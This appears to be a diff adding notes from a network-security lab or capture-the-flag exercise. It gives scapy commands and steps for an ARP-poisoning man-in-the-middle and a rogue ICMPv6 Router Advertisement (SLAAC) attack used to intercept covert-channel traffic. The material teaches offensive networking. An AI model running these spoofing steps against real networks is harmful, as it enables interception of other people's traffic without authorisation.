@@ -1,1 +1,76 @@
 
+Data is being sent to T3 from an unknown source over an ICMP covert channel. Use scapy to perform a MitM using ARP to capture this data.
+On T2 edit the /proc/sys/net/ipv4/ip_forward file to enable IP Forwarding. Change the value from 0 to 1.
+On T2 open scapy as root.
+Create the Ethernet Header (Ether) and change the ether-type to the hex value for ARP.
+Create the ARP header (ARP) to Poison T4
+Create the ARP header (ARP) to Poison T3
+Send your crafted headers using sendp.
+Intercept the flag being sent over the network.
+Use TCPDUMP or Wireshark to capture the FLAG using icmp and host 172.16.82.115 capture filters to minimize the traffic.
+The mission prompt will provide the target details.
+
+a=Ether()
+>>> a.show()
+a.type=0x0806
+
+b=ARP()
+>>> b.hwsrc="fa:16:3e:00:50:b1"
+>>> b.show()
+###[ ARP ]### 
+  hwtype    = 0x1
+  ptype     = IPv4
+  hwlen     = None
+  plen      = None
+  op        = who-has
+  hwsrc     = fa:16:3e:xx:50:xx
+  psrc      = 172.16.xx.xxx
+  hwdst     = 00:00:00:00:00:00
+  pdst      = 0.0.0.0
+  
+   b.psrc="172.16.82.126"
+   b.op="is-at"
+
+sendp (a/b, iface="eth0")
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------
+Provide proof of the functional ICMPv6 Router Advertisement to Mission Command.
+Data is being sent from T3 to an unknown target using an ICMPv6 covert channel. Use scapy to perform a SLAAC MitM using ICMPv6 to capture this data.
+On T2 open scapy as root.
+Create the IPv6 header (IPv6) using the All Nodes multicast address.
+Create the ICMPv6 Router Advertisement Header (ICMPv6ND_RA).
+Create the Source Link-Local Address Option Header (ICMPv6NDOptSrcLLAddr) using your MAC as the source.
+Create the ICMPv6 MTU Option Header (ICMPv6NDOptMTU).
+Create the ICMPv6 Prefix Information Header (ICMPv6NDOptPrefixInfo) and assign the Prefix (fd00:deaf:cafe::) and Prefix Length of 64.
+Send your crafted headers using send.
+Intercept the flag being sent over the network.
+Use TCPDUMP or Wireshark to capture the FLAG using icmp6 capture filters to minimize the traffic.
+The mission prompt will provide the target details.
+
+
+
+a=IPv6()
+>>> a.show()
+
+b=ICMPv6ND_RA()
+>>> b.show()
+
+c=ICMPv6NDOptSrcLLAddr()
+>>> c.show()
+ c.lladdr="fa:16:3e:00:50:b1"
+  
+ d=ICMPv6NDOptMTU()
+>>> d.show()
+
+e=ICMPv6NDOptPrefixInfo()
+>>> e.show()
+e.prefix="fd00:deaf:cafe::"
+>>> e.show()
+
+send(a/b/c/d/e, iface="eth0")
+
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
